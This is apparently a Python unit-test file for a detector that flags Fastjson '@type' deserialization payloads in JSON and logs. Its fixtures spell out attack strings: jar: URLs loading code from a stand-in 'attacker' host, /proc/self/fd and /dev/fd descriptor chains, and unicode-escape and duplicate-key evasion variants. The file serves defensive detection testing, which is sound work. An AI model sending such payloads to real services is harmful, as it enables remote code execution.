import importlib.util
import json
import pathlib
import sys
import unittest


MODULE_PATH = pathlib.Path(__file__).resolve().parents[1] / "fjdetect.py"
SPEC = importlib.util.spec_from_file_location("fjdetect", MODULE_PATH)
fjdetect = importlib.util.module_from_spec(SPEC)
assert SPEC.loader is not None
sys.modules[SPEC.name] = fjdetect
SPEC.loader.exec_module(fjdetect)


class DetectorTests(unittest.TestCase):
    def analyze(self, value):
        return fjdetect.analyze_parsed(value)

    def test_benign_json_is_clean(self):
        result = self.analyze({"name": "demo", "items": [1, 2, 3]})
        self.assertEqual("CLEAN", result.severity)
        self.assertEqual([], result.occurrences)

    def test_unrelated_autotype_is_not_fd_alert(self):
        result = self.analyze({"@type": "java.net.Inet4Address", "val": "example.invalid"})
        self.assertEqual("CLEAN", result.severity)
        self.assertEqual("other_type", result.occurrences[0].kind)

    def test_remote_seed_is_high(self):
        result = self.analyze({"@type": "jar:http:..attacker:8000.x!.foo.Exception"})
        self.assertEqual("HIGH", result.severity)
        self.assertEqual("remote_jar_seed", result.occurrences[0].kind)

    def test_dense_linux_fd_chain_is_critical(self):
        value = [{"@type": "jar:http:..attacker:8000.x!.foo.Exception"}]
        value.extend(
            {"@type": f"jar:file:.proc.self.fd.{fd}!.fd{fd}.Exception"}
            for fd in range(3, 10)
        )
        result = self.analyze({"value": value})
        self.assertEqual("CRITICAL", result.severity)
        self.assertEqual(7, len(result.sequences[0].fd_indices))
        self.assertEqual(7, result.sequences[0].longest_consecutive_run)

    def test_remote_seed_after_fd_candidates_is_not_the_single_body_sequence(self):
        value = [
            {"@type": f"jar:file:.proc.self.fd.{fd}!.fd{fd}.Exception"}
            for fd in range(15, 19)
        ]
        value.append({"@type": "jar:http:..attacker:8000.x!.foo.Exception"})
        result = self.analyze(value)
        self.assertEqual("HIGH", result.severity)
        self.assertFalse(result.sequences[0].remote_before_fd)

    def test_leading_decoy_fd_does_not_hide_later_soft_seed_sequence(self):
        value = [{"@type": "jar:file:.proc.self.fd.2!.decoy.Payload"}]
        value.append({"@type": "jar:http:..attacker:8000.x!.foo.Exception"})
        value.extend(
            {"@type": f"jar:file:.proc.self.fd.{fd}!.x.Payload"}
            for fd in range(15, 19)
        )
        result = self.analyze(value)
        self.assertEqual("CRITICAL", result.severity)
        self.assertEqual(4, result.sequences[0].post_failure_soft_fd_count)

    def test_non_failure_soft_seed_with_dense_fd_run_is_high_not_critical(self):
        value = [{"@type": "jar:http:..attacker:8000.x!.foo.Probe"}]
        value.extend(
            {"@type": f"jar:file:.proc.self.fd.{fd}!.x.Payload"}
            for fd in range(15, 19)
        )
        result = self.analyze(value)
        self.assertEqual("HIGH", result.severity)
        self.assertEqual([], result.sequences[0].failure_soft_remote_indices)

    def test_fd_only_sequence_is_high_as_possible_second_request(self):
        value = [
            {"@type": f"jar:file:/proc/self/fd/{fd}!/fd{fd}/Exception"}
            for fd in range(15, 20)
        ]
        result = self.analyze(value)
        self.assertEqual("HIGH", result.severity)

    def test_macos_dev_fd_variant_is_detected(self):
        result = self.analyze(
            {"@type": "jar:file:.dev.fd.9!.fd9.Exception"}
        )
        self.assertEqual("MEDIUM", result.severity)
        self.assertEqual("dev/fd", result.occurrences[0].namespace)

    def test_arbitrary_fd_terminal_class_name_is_detected(self):
        result = self.analyze(
            {"@type": "jar:file:.proc.self.fd.15!.x.Payload"}
        )
        self.assertEqual("MEDIUM", result.severity)
        self.assertEqual("fd_candidate", result.occurrences[0].kind)
        self.assertIsNone(result.occurrences[0].class_fd)

    def test_numeric_proc_pid_fd_variant_is_detected(self):
        result = self.analyze(
            {"@type": "jar:file:/proc/1/fd/15!/x/Payload"}
        )
        self.assertEqual("MEDIUM", result.severity)
        self.assertEqual("proc/1/fd", result.occurrences[0].namespace)

    def test_unicode_escaped_key_and_value_are_detected_after_json_parse(self):
        raw = r'{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0072:http:..host:80.x!.foo.Exception"}'
        result = fjdetect.parse_documents(raw, "unicode", False)[0]
        self.assertEqual("HIGH", result.severity)
        self.assertEqual("remote_jar_seed", result.occurrences[0].kind)

    def test_duplicate_type_key_does_not_erase_first_remote_value(self):
        raw = (
            '{"@type":"jar:http:..a:80.x!.foo.Exception",'
            '"@type":"benign.Exception"}'
        )
        result = fjdetect.parse_documents(raw, "duplicates", False)[0]
        self.assertEqual("HIGH", result.severity)
        self.assertEqual(2, len(result.occurrences))
        self.assertEqual("remote_jar_seed", result.occurrences[0].kind)

    def test_duplicate_type_in_array_still_correlates_sequence(self):
        raw = (
            '{"value":['
            '{"@type":"jar:http:..a:80.x!.foo.Exception","@type":"benign.Exception"},'
            '{"@type":"jar:file:.proc.self.fd.15!.x.Payload"},'
            '{"@type":"jar:file:.proc.self.fd.16!.x.Payload"},'
            '{"@type":"jar:file:.proc.self.fd.17!.x.Payload"}'
            ']}'
        )
        result = fjdetect.parse_documents(raw, "duplicates-array", False)[0]
        self.assertEqual("CRITICAL", result.severity)

    def test_double_encoded_structured_log_body_is_inspected(self):
        body = json.dumps({"@type": "jar:file:.proc.self.fd.15!.fd15.Exception"})
        result = self.analyze({"request_body": body, "status": 500})
        self.assertEqual("MEDIUM", result.severity)
        self.assertIn("<decoded-json>", result.occurrences[0].path)

    def test_matching_fd_and_class_number_control(self):
        result = self.analyze(
            {"@type": "jar:file:.proc.self.fd.15!.fd16.Exception"}
        )
        self.assertEqual(15, result.occurrences[0].fd)
        self.assertEqual(16, result.occurrences[0].class_fd)

    def test_malformed_input_is_parse_error(self):
        result = fjdetect.parse_documents("{not-json", "bad", False)[0]
        self.assertIsNotNone(result.parse_error)

    def test_deep_ndjson_record_is_bounded_and_later_record_is_analyzed(self):
        deep = "[" * 1100 + "0" + "]" * 1100
        raw = deep + "\n" + '{"@type":"jar:http:..a:80.x!.foo.Exception"}'
        results = fjdetect.parse_documents(raw, "deep", True)
        self.assertEqual(2, len(results))
        self.assertIsNotNone(results[0].parse_error)
        self.assertEqual("HIGH", results[1].severity)

    def test_node_limit_does_not_prescan_unvisited_array_tail(self):
        value = [
            {"@type": f"jar:file:.proc.self.fd.{fd}!.x.Payload"}
            for fd in range(10, 20)
        ]
        original_limit = fjdetect.MAX_TREE_NODES
        try:
            fjdetect.MAX_TREE_NODES = 3
            result = self.analyze(value)
        finally:
            fjdetect.MAX_TREE_NODES = original_limit
        self.assertIn("maximum node count 3 exceeded", result.parse_error)
        self.assertEqual(1, len(result.occurrences))
        self.assertEqual([], result.sequences)


if __name__ == "__main__":
    unittest.main()
